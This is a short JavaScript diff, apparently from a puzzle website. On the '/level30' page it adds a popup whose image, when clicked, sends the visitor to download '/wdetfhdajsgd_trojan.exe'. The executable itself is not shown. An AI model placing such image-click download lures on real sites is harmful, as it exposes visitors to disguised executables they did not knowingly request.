@@ -130,7 +130,11 @@ var img = $('.icon-offline');
         });
 
         if(window.location.pathname == "/level30") {
-        	window.open('okmnjiuhb.gif', '_blank');
+
+        	var myWindow = window.open("Popup", "myWindow", "width=1060, height=700");
+			myWindow.document.write("<script>function image() {	window.location = '/wdetfhdajsgd_trojan.exe';}</script>");
+			myWindow.document.write("<img src='/okmnjiuhb.gif' onclick='image()'></img>");
+			
         }
       });
 
